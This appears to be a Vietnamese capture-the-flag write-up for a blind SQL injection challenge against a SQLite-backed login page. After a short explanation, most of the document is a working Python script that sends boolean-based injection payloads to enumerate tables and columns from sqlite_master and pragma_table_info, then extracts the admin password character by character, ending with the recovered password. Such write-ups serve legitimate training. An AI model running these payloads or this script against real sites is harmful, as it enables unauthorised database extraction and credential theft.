Sử dụng ký tự `'` để xem có bị dính SQLi hay không, thì thấy bị dính lỗi

![image](https://github.com/user-attachments/assets/91d74e82-ff60-4e20-997d-744db7d38d5e)

Thấy web sử dụng sqlite làm database với câu lệnh truy vấn

```SELECT * FROM users WHERE uid = 'username'```

Do description cho biết password nằm trong cột `upw`, nên có thể viết script bruteforce password của admin luôn.

Ở đây mình viết thêm cả script để dump các thuộc tính của các bảng trong db luôn phòng trường hợp cần dùng đến.

```python
import requests
url = 'http://103.97.125.56:31201/?uid='
payload_count_table = "' or (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) ="
omega = 'abcdefghijklmnopqrstuvwxyz0123456789_'
def send(url):
    response = requests.get(url)
    # print(url)
    if response.status_code == 200:
        if 'exists' in response.text:
            return True
    return False
# Lấy số lương table
i = 0
stop = True
while (stop):
    i+=1
    if send(url+payload_count_table+str(i)+'--+'):
        stop = False
count = i
print("So luong bang:",str(i))


# Lấy tên bảng
payload_length_table = "' or (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset "
list_table = []
for i in range(count):
    # Độ dài tên từng bảng
    j = 0
    stop = True
    while (stop):
        j+=1
        if send(url+payload_length_table+str(i)+')= '+str(j)+'--+'):
            stop = False
    length = j
    # brute force tên bảng
    name=''
    for j in range(1,length+1):
        for c in omega:
            payload_name_table = f"' or (SELECT hex(substr(tbl_name,{j},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset {i}) = hex('{c}') --+"
            if send(url+payload_name_table):
                name +=c
                break
    list_table.append(name)

print("Các bảng: ",list_table)



# Lấy tên cột của các bảng
for table in list_table:
    list_col = []
    i = 0
    stop = True
    while (stop):
        i+=1
        payload = poayload_count_col= f"' or (select count(name) from pragma_table_info('{table}') as tblInfo) = {i} --+"
        if send(url+payload):
            stop = False
    count = i
    print("Số lượng cột: ",count)
    for i in range(count):
        # Độ dài tên từng cột
        j = 0
        stop = True
        while (stop):
            j+=1
            payload_length_col = f"' or (SELECT length(name) from pragma_table_info('{table}') as tblInfo limit 1 offset {i}) = {j} --+"
            if send(url+payload_length_col):
                stop = False
        length = j
        # brute force tên côt
        print(f"Độ dài cột {i}:",length)
        name=''
        for j in range(1,length+1):
            for c in omega:
                payload_name_col = f"' or (SELECT hex(substr(name,{j},1)) FROM pragma_table_info('{table}') limit 1 offset {i}) = hex('{c}') --+"
                if send(url+payload_name_col):
                    name +=c
                    break
        list_col.append(name)
    print(f"các cột của bảng {table}: ",list_col)

# Độ dài password
j = 0
stop = True
while (stop):
    j+=1
    payload_length_col = f"' or (SELECT length(upw) from users where uid = 'admin') = {j} --+"
    if send(url+payload_length_col):
        stop = False
length = j
# brute force password
print(f"Độ dài password:",length)
password=''
for j in range(1,length+1):
    for c in omega:
        payload_name_col = f"' or (SELECT hex(substr(upw,{j},1)) from users where uid = 'admin') = hex('{c}') --+"
        if send(url+payload_name_col):
            password +=c
            break
print("password of admin: ",password)
```
Sau khi có password là `y0u_4r3_4dm1n` thì đăng nhập trong `/login` để lấy flag thôi
